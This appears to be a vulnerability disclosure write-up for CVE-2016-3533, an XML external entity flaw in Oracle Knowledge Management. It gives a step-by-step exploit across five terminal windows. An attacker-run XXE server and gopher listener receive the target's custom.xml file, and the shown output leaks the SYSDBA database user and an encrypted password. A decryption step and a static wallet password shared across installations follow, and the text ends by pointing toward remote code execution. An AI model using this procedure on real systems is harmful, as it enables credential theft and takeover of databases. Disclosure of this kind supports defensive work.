Oracle Knowledge Management Castor Library XML External Entity Injection Information Disclosure Vulnerability
CVE: CVE-2016-3533
SRC: SRC-2016-23

Details:
--------
I have provided the keystore files used by the decryption routine. The resource key extracted from the keystore can be bruteforced, however I provided the keystore 
for ease of demonstration. You will need to use your own keystore for testing purposes.

To exploit this vulnerability, you will need todo the following:

Window 1 - setup a 'malicious' xxe server:
------------------------------------------

steven@pluto:~/oracle$ ruby xxeserve.rb -o 0.0.0.0
[2015-02-09 16:03:45] INFO  WEBrick 1.3.1
[2015-02-09 16:03:45] INFO  ruby 1.9.3 (2013-11-22) [x86_64-linux]
== Sinatra/1.4.5 has taken the stage on 4567 for development with backup from WEBrick
[2015-02-09 16:03:45] INFO  WEBrick::HTTPServer#start: pid=18862 port=4567
172.16.77.128 - - [09/Feb/2015:16:04:10 +1100] "GET /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml HTTP/1.1" 200 173 0.0089
172.16.77.128 - - [09/Feb/2015:16:04:10 AEDT] "GET /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml HTTP/1.1" 200 173
- -> /xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml

Window 2 - setup a listener for the gopher protocol:
----------------------------------------------------

steven@pluto:~/oracle$ ./gopher.py
starting up on 0.0.0.0 port 1337
waiting for a connection
connection from ('172.16.77.128', 50746)
(+) The database SID is: jdbc:oracle:thin:@WIN-U94QE7O15KE:1521:IM
(+) The database username is: SYS as SYSDBA
(+) The database password is: VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4=

Window 3 - steal the 'custom.xml' file
--------------------------------------

steven@pluto:~/oracle$ ./poc.py 172.16.77.1:4567 172.16.77.128
(+) pulling custom.xml for the db password...
(!) Success! please check the gopher.py window!

Window 4 - decrypt/crack the encrypted password:
------------------------------------------------

NOTES: 
- You maybe able to disclose the wallet and keystore using the vulnerability, in which case you do not need to decrypt the string. 
  However, this was not verified at the time of discovery
- The alternative is you can bruteforce the encryption key which is contained in the wallet (Using PBEWithMD5AndTripleDES).
- To access the wallent, Oracle Knowledge uses 'OracleKnowledge1' as the static password across all installations.

Assuming you have cracked the encryption key or downloaded the wallet & keystore, you can perform the following:

steven@pluto:~/oracle$ ./decrypt.sh VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4=
(+) Decrypting... "VO4+OdJq+LXTkmSdXgvCg37TdK9mKftuz2XFiM9mif4="
Result: "password"

Window 5 - obtain Remote Code Execution
---------------------------------------

The installation uses the SYSDBA account, so you can login to the database remotely and execute arbitrary SQL or code.
